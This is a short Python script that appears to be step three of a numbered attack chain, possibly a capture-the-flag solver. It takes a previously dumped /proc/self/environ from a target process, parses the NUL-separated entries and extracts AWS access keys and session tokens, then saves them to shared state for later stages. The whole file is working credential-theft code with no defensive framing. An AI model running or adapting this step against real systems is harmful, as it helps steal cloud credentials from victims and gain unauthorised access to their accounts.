# file: 03_extract_creds.py
import re
from shared.helpers import State

KEYS = [
    'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY',
    'AWS_SESSION_TOKEN'
]

def parse_environ(raw):
    # /proc/self/environ entries are NUL-separated ("\x00").
    parts = re.split(r"\x00|\n|\r\n", raw)
    kv = {}
    for p in parts:
        if '=' in p:
            k, v = p.split('=', 1)
            if k in KEYS:
                kv[k] = v.strip()
    return kv

def main():
    mem = State.load_mem()
    raw = mem.get('environ_raw', '')
    if not raw:
        raise SystemExit("No environ_raw found. Run 02_dump_environ.py first.")

    creds = parse_environ(raw)
    if len(creds) < 3:
        print("[!] Could not find all credentials. Found:")
        for k, v in creds.items():
            print(f"    {k}={v[:6]}…")
    else:
        print("[+] Extracted AWS creds from environ")

    mem.update(creds)
    State.save_mem(mem)

if __name__ == '__main__':
    main()